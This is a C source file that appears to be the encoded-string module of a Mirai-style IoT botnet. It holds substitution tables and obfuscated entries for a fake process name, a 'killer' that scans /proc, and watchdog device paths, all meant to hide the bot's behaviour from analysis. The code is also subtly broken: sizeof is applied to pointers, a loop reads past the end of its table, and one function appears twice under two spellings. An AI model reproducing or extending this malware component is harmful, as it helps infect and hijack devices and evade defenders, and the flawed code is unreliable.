#ifdef DEBUG
#include <stdio.h>
#endif

#include <stdint.h>
#include <stdlib.h>

#include "encode.h"
#include "util.h"

char encodes[] = {
    '\xaa', '\xab', '\xac', '\xad', '\xae', '\xaf', '\xba', '\xbb', '\xbc', '\xbd', '\xbe', '\xbf', '\xca', '\xcb', '\xcc', '\xcd',
    '\xce', '\xcf', '\xda', '\xdb', '\xdc', '\xde', '\xdf', '\xea', '\xeb', '\xec', '\xed', '\xef', '\xfa', '\xfb', '\xfc', '\xfd',
    '\xfe', '\xff', '\xa1', '\xa2', '\xa3', '\xa4', '\xa5', '\xa6', '\xa7', '\xa8', '\xa9', '\xb1', '\xb2', '\xb3', '\xb4', '\xb5',
    '\xb6', '\xb7', '\xb8', '\xb9', '\xc1', '\xc2', '\xc3', '\xc4', '\xc5', '\xc6', '\xc7', '\xc8', '\xc9', '\xd1', '\xd2', '\xd3',
    '\xd4', '\xd5', '\xd6', '\xd7', '\xd8', '\xd9', '\xe1', '\xe2', '\xe3', '\xe4', '\xe5', '\xe6', '\xe7', '\xe8', '\xe9', '\xf1',
    '\xf2', '\xf3', '\xf4', '\xf5', '\xf6'
};

char decodes[] = {
    'z', '7', 'u', 'N', 'B', 'c', '3', ' ', 'a', '2', 'L', 'T', '#', 'v', 'J', 'H',
    '8', 'I', '%', 'b', 'F', 'w', 'k', 'h', '/', '"', 's', ';', 'U', '$', 'e', 'S',
    ':', 'D', 'Z', 'C', 'j', 'E', 'm', 'Y', 'x', 'W', 'p', 't', '|', 'o', '>', '&',
    'f', 'd', '-', '5', 'G', '9', 'q', 'R', 'M', '@', '~', '4', 'Q', '0', 'y', 'X',
    'l', 'g', 'A', 'K', 'P', '6', 'i', '1', 'V', 'r', 'O', '\\', ')', ']', '.', '(',
    '[', 'n', '{', '}', ','
};

struct enc_value encvals[ENC_MAX_KEYS];

void enc_init(void)
{
    add_entry(ENC_MAIN_TXT, "\xa5\xb3\xaf\xe9\xe4\xfc\xd5\xd5\xe2\xf3\xe9\xd2\xb1\xe4\xbc\xa9\xb7\xe1\xbc\xd4\xb3\xb3\xaf\xfc\xea\xb1\xb1\xbc\xd2\xbc\xb7\xe4\xfc\xd5\xd5\xe1\xf3\xd4\xbc\xaf\xe1\xa9\xd2\xb1", 44);
    add_entry(ENC_FAKENAME, "\xe8\xb7\xfc\xea\xaf\xed\xac\xaf\xe4\xf2\x00", 10);
    add_entry(ENC_EXEC_MSG, "\xe8\xfc\xd5\xbc\xe4\xb3\xb1\xed\xb8\xdb\xed\xac\xf2", 13);
    add_entry(ENC_KILLER_PROC, "\xeb\xaf\xb3\xe4\xa9\xeb", 6);
    add_entry(ENC_KILLER_PROCNET, "\xa9\xaf\xb1\xeb\xb1\xfc\xf3\xeb\xaf\xb3\xe4\xa9\xeb", 13);
    add_entry(ENC_KILLER_PROCFS, "\xeb\xaf\xb3\xe4\xa9\xeb", 6);
    add_entry(ENC_WATCHDOG_ONE, "\xd5\xb3\xb7\xea\xaf\xb1\xbc\xde\xeb\xcb\xfc\xb7\xeb", 13);
    add_entry(ENC_WATCHDOG_TWO, "\xd5\xb3\xb7\xea\xaf\xb1\xbc\xde\xeb\xaf\xed\xe1\xa5\xeb\xcb\xfc\xb7\xeb", 18);
}

void enc_decode(char *input, char *output)
{
    int x = 0, i = 0, c = 0, q = 0, str_len = util_strlen(input);
    char instring[str_len + 1], flipstring[str_len];

    util_memcpy(instring, input, str_len + 1);
    util_memset(output, 0, sizeof(output));

    for (c = util_strlen(instring) - 1; c != -1; c--)
    {
        flipstring[q] = instring[c];
        q++;
    }
    flipstring[q] = '\0';

    if (q != str_len)
    {
        util_memset(flipstring, 0, sizeof(flipstring));
        return;
    }

    while (x < str_len)
    {
        for (c = 0; c <= sizeof(encodes); c++)
        {
            if (flipstring[x] == encodes[c])
            {
                output[i] = decodes[c];
                i++;
            }
        }
        x++;
    }

    util_memset(flipstring, 0, sizeof(flipstring));
    output[i] = '\0';
    return;
}

void enc_retrive(int id, char *output)
{
    struct enc_value *val = &encvals[id];
    int x = 0, i = 0, c = 0, q = 0, str_len = util_strlen(val->encoded);
    char instring[str_len + 1], flipstring[str_len];

    util_memcpy(instring, val->encoded, str_len + 1);
    util_memset(output, 0, sizeof(output));

    for (c = util_strlen(instring) - 1; c != -1; c--)
    {
        flipstring[q] = instring[c];
        q++;
    }
    flipstring[q] = '\0';

    if (q != str_len)
    {
        util_memset(flipstring, 0, sizeof(flipstring));
        return;
    }

    while (x < str_len)
    {
        for (c = 0; c <= sizeof(encodes); c++)
        {
            if (flipstring[x] == encodes[c])
            {
                output[i] = decodes[c];
                i++;
            }
        }
        x++;
    }

    util_memset(flipstring, 0, sizeof(flipstring));
    output[i] = '\0';
    return;
}

void enc_retrieve(int id, char *output)
{
    struct enc_value *val = &encvals[id];
    int x = 0, i = 0, c = 0, q = 0, str_len = util_strlen(val->encoded);
    char instring[str_len + 1], flipstring[str_len];

    util_memcpy(instring, val->encoded, str_len + 1);
    util_memset(output, 0, sizeof(output));

    for (c = util_strlen(instring) - 1; c != -1; c--)
    {
        flipstring[q] = instring[c];
        q++;
    }
    flipstring[q] = '\0';

    if (q != str_len)
    {
        util_memset(flipstring, 0, sizeof(flipstring));
        return;
    }

    while (x < str_len)
    {
        for (c = 0; c <= sizeof(encodes); c++)
        {
            if (flipstring[x] == encodes[c])
            {
                output[i] = decodes[c];
                i++;
            }
        }
        x++;
    }

    util_memset(flipstring, 0, sizeof(flipstring));
    output[i] = '\0';
    return;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len + 1);
    util_memcpy(cpy, buf, buf_len);

    encvals[id].encoded = cpy;
}
